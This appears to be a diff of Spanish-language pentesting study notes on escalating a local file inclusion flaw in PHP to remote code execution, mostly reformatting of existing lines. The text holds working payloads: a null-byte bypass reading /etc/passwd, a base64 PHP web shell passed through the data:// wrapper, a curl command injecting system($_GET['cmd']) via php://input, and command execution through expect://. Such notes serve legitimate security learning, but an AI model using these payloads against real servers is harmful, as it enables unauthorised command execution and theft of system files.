@@ -31,19 +31,27 @@ Aveces la funcionalidad que carga los archivos tiene una validación de extensi�
 esto podemos bypassearlo agregando algunos chars como 00%:
         filename=../../../etc/passwd%00.png
 
-############### RCE
+### RCE
 
 podemos lograr rce utilizando el filtro "data" si el parametro allow_url_include se encuentra habilitado:
-data://text/plain;base64,"web shell en base64"&"parametro de la shell"="comando"
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd="comando"
+
+                data://text/plain;base64,"web shell en base64"&"parametro de la shell"="comando"
+
+
+                data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd="comando"
 
 para métodos POST podemos utilizar el filtro "input":
+
 ejemplo en curl:
-curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+
+
+                curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
 
 En algunos casos los servidores pueden tener instalado el filtro expect que permite en sí mismo correr comandos:
+
+
 ejemplo en curl:
-curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+                curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
 
 
 
